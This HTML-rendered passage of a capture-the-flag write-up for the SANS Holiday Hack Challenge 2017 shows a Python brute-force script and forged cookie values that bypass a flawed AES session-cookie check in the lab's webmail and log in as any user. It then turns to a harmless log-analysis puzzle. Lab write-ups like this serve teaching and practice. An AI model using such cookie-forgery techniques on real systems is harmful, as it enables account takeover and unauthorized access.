&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;aes256&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;plaintext&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="s1"&gt;&amp;#39;L07kb9VSHbavnunjI/4aom8KcS4=&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's take a look at our ciphertext:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt;  &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;L07kb9VSHbavnunjI/4aom8KcS4=&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; base64 -d &lt;span class="p"&gt;|&lt;/span&gt; hexdump -C
&lt;span class="go"&gt;00000000  2f 4e e4 6f d5 52 1d b6  af 9e e9 e3 23 fe 1a a2  |/N.o.R......#...|&lt;/span&gt;
&lt;span class="go"&gt;00000010  6f 0a 71 2e                                       |o.q.|&lt;/span&gt;
&lt;span class="go"&gt;00000014&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hmmm, our output is 20 bytes, which is not a multiple of AES block-size. This
is weird. The first block of our ciphertext (16 bytes) must be the
initialization vector, which leaves a 4-byte block. Incidently, 4 bytes is
exactly the size of our plaintext. After several manual tries, I confirmed that
the plaintext and the ciphertext have the same size, which is the first oops.&lt;/p&gt;
&lt;p&gt;The second oops is that the cookie verification code does not perform any check
on the payload sent in the cookie. So it will happily accept one-byte long
payload &lt;span class="strike"&gt;(but unfortunately, not empty payload)&lt;/span&gt; &lt;strong&gt;(it actually does,
see after)&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;So, if we send a one-byte long payload, there are only 256 possible values for
the ciphertext, which is easily bruteforceable on line. Here's a Python script
that will try to find a valid cookie:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python3&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;base64&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="c1"&gt;# The URL we try to access&lt;/span&gt;
    &lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://10.142.0.5/account.html&amp;#39;&lt;/span&gt;

    &lt;span class="c1"&gt;# Our cookie template, with a one-byte long plaintext&lt;/span&gt;
    &lt;span class="n"&gt;cookie_template&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;{{&amp;quot;name&amp;quot;:&amp;quot;alabaster.snowball@northpolechristmastown.com&amp;quot;,&amp;quot;plaintext&amp;quot;:&amp;quot;a&amp;quot;,&amp;quot;ciphertext&amp;quot;:&amp;quot;{}&amp;quot;}}&amp;#39;&lt;/span&gt;

    &lt;span class="c1"&gt;# Our arbitrary IV&lt;/span&gt;
    &lt;span class="n"&gt;iv&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x90&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;

    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;candidate&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;256&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="c1"&gt;# We create our candidate cipher text, by appending the one-byte value&lt;/span&gt;
        &lt;span class="c1"&gt;# to our IV, and base64 encoding it&lt;/span&gt;
        &lt;span class="n"&gt;ciphertext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;iv&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;candidate&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="c1"&gt;# We then create our cookie, and get the wanted page&lt;/span&gt;
        &lt;span class="n"&gt;cookies&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;EWA&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;cookie_template&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ciphertext&lt;/span&gt;&lt;span class="p"&gt;)}&lt;/span&gt;
        &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="c1"&gt;# If we get a positive return, we output the cookie&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status_code&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;script&amp;gt;window.location.href=&lt;/span&gt;&lt;span class="se"&gt;\&amp;#39;&lt;/span&gt;&lt;span class="s1"&gt;/&lt;/span&gt;&lt;span class="se"&gt;\&amp;#39;&lt;/span&gt;&lt;span class="s1"&gt;&amp;lt;/script&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;break&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We launch our script through &lt;code&gt;proxychains&lt;/code&gt; and...&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; proxychains ./cookie_finder.py
&lt;span class="go"&gt;ProxyChains-3.1 (http://proxychains.sf.net)&lt;/span&gt;
&lt;span class="go"&gt;|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:4242-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-10.142.0.5:80-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK&lt;/span&gt;
&lt;span class="go"&gt;[snip]&lt;/span&gt;
&lt;span class="go"&gt;{&amp;#39;EWA&amp;#39;: &amp;#39;{&amp;quot;name&amp;quot;:&amp;quot;alabaster.snowball@northpolechristmastown.com&amp;quot;,&amp;quot;plaintext&amp;quot;:&amp;quot;a&amp;quot;,&amp;quot;ciphertext&amp;quot;:&amp;quot;kJCQkJCQkJCQkJCQkJCQkGk=&amp;quot;}&amp;#39;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Bingo! We get a valid cookie for Alabaster's account!&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;lt;Errata&amp;gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;After solving this part, I checked the hints given by the Elf of this level,
Pepper Minstix:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;AES256? Honestly, I don't know much about it, but Alabaster explained the
basic idea and it sounded easy. During decryption, the first 16 bytes are
removed and used as the initialization vector or &amp;quot;IV.&amp;quot; Then the IV + the
secret key are used with AES256 to decrypt the remaining bytes of the
encrypted string.&lt;/p&gt;
&lt;p&gt;Hmmm. That's a good question, I'm not sure what would happen if the
encrypted string was only 16 bytes long.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So the system does in fact accept empty &lt;code&gt;plaintext&lt;/code&gt; variables, with
any &lt;code&gt;ciphertext&lt;/code&gt; that is 16-byte long. So using this cookie works:
&lt;code&gt;{&amp;quot;name&amp;quot;:&amp;quot;alabaster.snowball&amp;#64;northpolechristmastown.com&amp;quot;,&amp;quot;plaintext&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;ciphertext&amp;quot;:&amp;quot;QUFBQUFBQUFBQUFBQUFBQQo=&amp;quot;}&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;I was sure to have checked this, but obviously I'm mistaken (that's an oops for
me)!&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;lt;/Errata&amp;gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Alright, now we have a valid cookie for Alabaster's account. Or any account
really. This is the third oops: there's no link between the &lt;code&gt;name&lt;/code&gt; set in
the cookie, and the &lt;code&gt;plaintext&lt;/code&gt; and &lt;code&gt;ciphertext&lt;/code&gt; variables. So now
that we have found a valid ciphertext for our plaintext &lt;code&gt;a&lt;/code&gt;, we can put
anything we want in the &lt;code&gt;name&lt;/code&gt; variable, such as
&lt;code&gt;admin&amp;#64;northpolechristmastown.com&lt;/code&gt;, and we'll be logged into the given
account:&lt;/p&gt;
&lt;img alt="ewa_alabaster_account.png" class="align-center" src="/images/sans-christmas-challenge-2017/ewa_alabaster_account.png" /&gt;
&lt;p&gt;If we snoop around Alabaster's mailbox, we find this email:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;From:&lt;/strong&gt; &lt;a class="reference external" href="mailto:holly.evergreen&amp;#64;northpolechristmastown.com"&gt;holly.evergreen&amp;#64;northpolechristmastown.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;To:&lt;/strong&gt; &lt;a class="reference external" href="mailto:all&amp;#64;northpolechristmastown.com"&gt;all&amp;#64;northpolechristmastown.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Subject:&lt;/strong&gt; Lost book page&lt;/p&gt;
&lt;p&gt;Hey Santa,&lt;/p&gt;
&lt;p&gt;Found this lying around. Figured you needed it.&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="http://mail.northpolechristmastown.com/attachments/GreatBookPage4_893jt91md2.pdf"&gt;http://mail.northpolechristmastown.com/attachments/GreatBookPage4_893jt91md2.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;:)&lt;/p&gt;
&lt;p&gt;-Holly&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We get a link to the &lt;a class="reference external" href="/docs/sans-christmas-challenge-2017/GreatBookPage4_893jt91md2.pdf"&gt;fourth page of The Great Book&lt;/a&gt;
(sha256: &lt;code&gt;6afe9f8c7dc8a392b6d853a05f1c1ce67b490633e3aa6c22faa3b1936f1ceed0&lt;/code&gt;):&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The Rise of the Lollipop Guild&lt;/p&gt;
&lt;p&gt;As tensions escalated immediately before The Great Schism, outright
fistfights erupted in the streets of the Emerald City as the most
radicalized Elves and Munchkins battled for turf. In those early days, the
small-scale skirmishes were disorganized and chaotic. But as hostilities
and violence continued to grow, organized groups of elite fighters emerged
on each side to take control of the militias. One particularly notherworthy
band of commandos named itself the &amp;quot;Lollipop Guild&amp;quot;.&lt;/p&gt;
&lt;p&gt;Today, despite its sweet candy-themed name, the Guild's mission is by no
means sugar coated. The official, stated focus of this liliputian force is
to apply elite military tactics to defend Oz against all Elven aggression.
What's more, it's also believed (at least among the Elves) that the
Lollipop Guild engages in offensive operations against the North Pole, both
from a cyber and kinetic perspective. The Elves consider the Lollipop Guild
to be a terrorist organization. Indeed, the North Pole Elven Blue Team
toils year-round defending the computer and network infrastructure of the
North Pole from attack. Their biggest fear is that the Lollipop Guild will
somehow disrupt or destroy the North Pole's biggest production of the year
- Santa's Christmas Day present delivery operation. The North Pole Blue
Team is on extremely high alert throughout Christmas Eve, and exhaustive
period of analysis and active defense this team refers to as &amp;quot;Blue
Christmas&amp;quot;.&lt;/p&gt;
&lt;p&gt;Although it has never been proven, the Elves allege that the Lollipop Guild
has infiltrated its operatives among the North Pole population, cleverly
disguising these nefarious interlopers as Elves. According to these rumors,
so-called Munchkin Moles mingle among even the Elven Elite. Because Elves
and Munchkins look identical, Elven leadership remains confounded about
whether Munchkin Moles actually exist. Yet, rumors persist.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="fifth-page-of-the-great-book"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id39"&gt;Fifth page of &lt;em&gt;The Great Book&lt;/em&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;The fifth page is located in North Pole and Beyond level. We must use the
giant falling snowball to collect it. But let's solve the Cranberry Pi
challenge first.&lt;/p&gt;
&lt;div class="section" id="north-pole-and-beyond-bumbles-bounce"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id40"&gt;North Pole and Beyond: Bumbles Bounce&lt;/a&gt;&lt;/h3&gt;
&lt;div class="section" id="id8"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id41"&gt;Cranberry Pi&lt;/a&gt;&lt;/h4&gt;
&lt;pre class="literal-block"&gt;
                           ._    _.
                           (_)  (_)                  &amp;lt;&amp;gt; \  / &amp;lt;&amp;gt;
                            .\::/.                   \_\/  \/_/
           .:.          _.=._\\//_.=._                  \\//
      ..   \o/   ..      '=' //\\ '='             _&amp;lt;&amp;gt;_\_\&amp;lt;&amp;gt;/_/_&amp;lt;&amp;gt;_
      :o|   |   |o:         '/::\'                 &amp;lt;&amp;gt; / /&amp;lt;&amp;gt;\ \ &amp;lt;&amp;gt;
       ~ '. ' .' ~         (_)  (_)      _    _       _ //\\ _
           &amp;gt;O&amp;lt;             '      '     /_/  \_\     / /\  /\ \
       _ .' . '. _                        \\//       &amp;lt;&amp;gt; /  \ &amp;lt;&amp;gt;
      :o|   |   |o:                   /\_\\&amp;gt;&amp;lt;//_/\
      ''   /o\   ''     '.|  |.'      \/ //&amp;gt;&amp;lt;\\ \/
           ':'        . ~~\  /~~ .       _//\\_
jgs                   _\_._\/_._/_      \_\  /_/
                       / ' /\ ' \                   \o/
       o              ' __/  \__ '              _o/.:|:.\o_
  o    :    o         ' .'|  |'.                  .\:|:/.
    '.\'/.'                 .                 -=&amp;gt;&amp;gt;::&amp;gt;o&amp;lt;::&amp;lt;&amp;lt;=-
    :-&amp;gt;&amp;#64;&amp;lt;-:                 :                   _ '/:|:\' _
    .'/.\'.           '.___/*\___.'              o\':|:'/o
  o    :    o           \* \ / */                   /o\
       o                 &amp;gt;--X--&amp;lt;
                        /*_/ \_*\
                      .'   \*/   '.
                            :
                            '
Minty Candycane here, I need your help straight away.
We're having an argument about browser popularity stray.
Use the supplied log file from our server in the North Pole.
Identifying the least-popular browser is your noteworthy goal.
&lt;/pre&gt;
&lt;p&gt;Alright, it seems we just have to analyze and find the least popular browser
in a log file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@7283fcc58ff6:~$&lt;/span&gt; ls -lh
&lt;span class="go"&gt;total 29M&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 root root  24M Dec  4 17:11 access.log&lt;/span&gt;
&lt;span class="go"&gt;-rwxr-xr-x 1 root root 5.0M Dec 11 17:31 runtoanswer&lt;/span&gt;
&lt;span class="gp"&gt;elf@7283fcc58ff6:~$&lt;/span&gt; head access.log
&lt;span class="go"&gt;XX.YY.66.201 - - [19/Nov/2017:06:50:30 -0500] &amp;quot;GET /robots.txt HTTP/1.1&amp;quot; 301 185 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;XX.YY.66.201 - - [19/Nov/2017:06:50:30 -0500] &amp;quot;GET /robots.txt HTTP/1.1&amp;quot; 404 5 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;XX.YY.89.151 - - [19/Nov/2017:07:13:03 -0500] &amp;quot;GET /img/common/apple-touch-icon-57x57.png HTTP/1.1&amp;quot; 200 3677 &amp;quot;-&amp;quot; &amp;quot;Slack-ImgProxy (+https://api.slack.com/robots)&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;XX.YY.66.201 - - [19/Nov/2017:07:22:12 -0500] &amp;quot;GET / HTTP/1.1&amp;quot; 301 185 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;XX.YY.45.77 - - [19/Nov/2017:07:43:08 -0500] &amp;quot;GET /img/common/apple-touch-icon-57x57.png HTTP/1.1&amp;quot; 200 3677 &amp;quot;-&amp;quot; &amp;quot;Slack-ImgProxy (+https://api.slack.com/robots)&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;XX.YY.201.12 - - [19/Nov/2017:08:21:10 -0500] &amp;quot;GET /manager/html HTTP/1.1&amp;quot; 301 185 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;XX.YY.218.124 - - [19/Nov/2017:08:22:09 -0500] &amp;quot;GET /img/common/favicon-128.png HTTP/1.1&amp;quot; 304 0 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;XX.YY.68.152 - - [19/Nov/2017:08:43:27 -0500] &amp;quot;GET /img/common/apple-touch-icon-57x57.png HTTP/1.1&amp;quot; 200 3677 &amp;quot;-&amp;quot; &amp;quot;Slack-ImgProxy (+https://api.slack.com/robots)&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;XX.YY.236.170 - - [19/Nov/2017:08:48:39 -0500] &amp;quot;GET /img/common/apple-touch-icon-57x57.png HTTP/1.1&amp;quot; 200 3677 &amp;quot;-&amp;quot; &amp;quot;slack/2.47.0.7352 (motorola Moto G (4); Android 7.0)&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;XX.YY.11.135 - - [19/Nov/2017:08:56:32 -0500] &amp;quot;GET / HTTP/1.1&amp;quot; 304 0 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see that the last column holds the user-agent. We can also observe that
the user-agent is just after the fifth double-quote on the line. So, if we use
the &lt;code&gt;cut&lt;/code&gt; command, with &lt;code&gt;&amp;quot;&lt;/code&gt; as a separator, we will get the
user-agent by asking for the sixth field:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@7283fcc58ff6:~$&lt;/span&gt; cut -d&lt;span class="s1"&gt;&amp;#39;&amp;quot;&amp;#39;&lt;/span&gt; -f &lt;span class="m"&gt;6&lt;/span&gt; access.log
&lt;span class="go"&gt;Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)&lt;/span&gt;
&lt;span class="go"&gt;Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)&lt;/span&gt;
&lt;span class="go"&gt;Slack-ImgProxy (+https://api.slack.com/robots)&lt;/span&gt;
&lt;span class="go"&gt;Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)&lt;/span&gt;
&lt;span class="go"&gt;Slack-ImgProxy (+https://api.slack.com/robots)&lt;/span&gt;
&lt;span class="go"&gt;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)&lt;/span&gt;
&lt;span class="go"&gt;Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0&lt;/span&gt;
&lt;span class="go"&gt;Slack-ImgProxy (+https://api.slack.com/robots)&lt;/span&gt;
&lt;span class="go"&gt;slack/2.47.0.7352 (motorola Moto G (4); Android 7.0)&lt;/span&gt;
&lt;span class="go"&gt;Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0&lt;/span&gt;
&lt;span class="go"&gt;[snip]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alright, now that we have only the user-agents, we can &lt;code&gt;sort&lt;/code&gt; the
user-agents, and use &lt;code&gt;uniq&lt;/code&gt; to  remove duplicates, and count the number
of unique user-agents:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@7283fcc58ff6:~$&lt;/span&gt; cut -d&lt;span class="s1"&gt;&amp;#39;&amp;quot;&amp;#39;&lt;/span&gt; -f &lt;span class="m"&gt;6&lt;/span&gt; access.log  &lt;span class="p"&gt;|&lt;/span&gt; sort &lt;span class="p"&gt;|&lt;/span&gt; uniq -c
&lt;span class="go"&gt;      2 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36&lt;/span&gt;
&lt;span class="go"&gt;    143 -&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;      1 Dillo/3.0.5&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;      3 GarlikCrawler/1.2 (http://garlik.com/, crawler@garlik.com)&lt;/span&gt;
&lt;span class="go"&gt;     34 Googlebot-Image/1.0&lt;/span&gt;
&lt;span class="go"&gt;      3 MobileSafari/604.1 CFNetwork/889.9 Darwin/17.2.0&lt;/span&gt;
&lt;span class="go"&gt;      4 Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&lt;/span&gt;
&lt;span class="go"&gt;      8 Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)&lt;/span&gt;
&lt;span class="go"&gt;    345 Mozilla/4.0 (compatible;)&lt;/span&gt;
&lt;span class="go"&gt;      2 Mozilla/5.0&lt;/span&gt;
&lt;span class="go"&gt;[snip]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hmm, &lt;code&gt;Dillo/3.0.5&lt;/code&gt; seems to be the least popular web-browser, with only
one entry. However, there may be other user-agents with only one hit in the
log file. Let's sort our counted output:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@7283fcc58ff6:~$&lt;/span&gt; cut -d&lt;span class="s1"&gt;&amp;#39;&amp;quot;&amp;#39;&lt;/span&gt; -f &lt;span class="m"&gt;6&lt;/span&gt; access.log  &lt;span class="p"&gt;|&lt;/span&gt; sort &lt;span class="p"&gt;|&lt;/span&gt; uniq -c &lt;span class="p"&gt;|&lt;/span&gt; sort -gr
&lt;span class="go"&gt;  27285 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&lt;/span&gt;
&lt;span class="go"&gt;   8501 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&lt;/span&gt;
&lt;span class="go"&gt;   6221 Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0&lt;/span&gt;
&lt;span class="go"&gt;   6183 Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&lt;/span&gt;
&lt;span class="go"&gt;   3163 Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko&lt;/span&gt;
&lt;span class="go"&gt;   2733 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/62.0.3202.94 Chrome/62.0.3202.94 Safari/537.36&lt;/span&gt;
&lt;span class="go"&gt;   2427 Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0&lt;/span&gt;
&lt;span class="go"&gt;   2099 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36&lt;/span&gt;
&lt;span class="go"&gt;   2006 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&lt;/span&gt;
&lt;span class="go"&gt;   2002 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36&lt;/span&gt;
&lt;span class="go"&gt;[snip]&lt;/span&gt;
&lt;span class="go"&gt;      2 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.47.1.7358 (samsung SM-G955F; Android 7.0)&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.47.1.7358 (samsung SM-G950U; Android 7.0)&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.47.1.7358 (samsung SM-G935T; Android 7.0)&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.47.1.7358 (samsung SM-G935L; Android 7.0)&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.47.1.7358 (samsung SM-G930F; Android 7.0)&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.47.1.7358 (samsung SM-G920P; Android 7.0)&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.47.1.7358 (motorola XT1635-02; Android 7.1.1)&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.47.1.7358 (motorola Moto G (5) Plus; Android 7.0)&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.47.1.7358 (Xiaomi Redmi Note 4; Android 7.0)&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.46.0.7100 (lenovo Lenovo K8 Note; Android 7.1.1)&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.47.1.7358 (OnePlus ONEPLUS A3000; Android 7.1.1)&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.47.1.7358 (OnePlus ONE A2003; Android 8.0.0)&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.47.1.7358 (LYF LS-5504; Android 5.1.1)&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.47.1.7358 (Intex Cloud Q11 4G; Android 6.0)&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.47.1.7358 (Huawei Nexus 6P; Android 8.0.0)&lt;/span&gt;
&lt;span class="go"&gt;      1 slack/2.47.1.7358 (HUAWEI AGS-W09; Android 7.0)&lt;/span&gt;
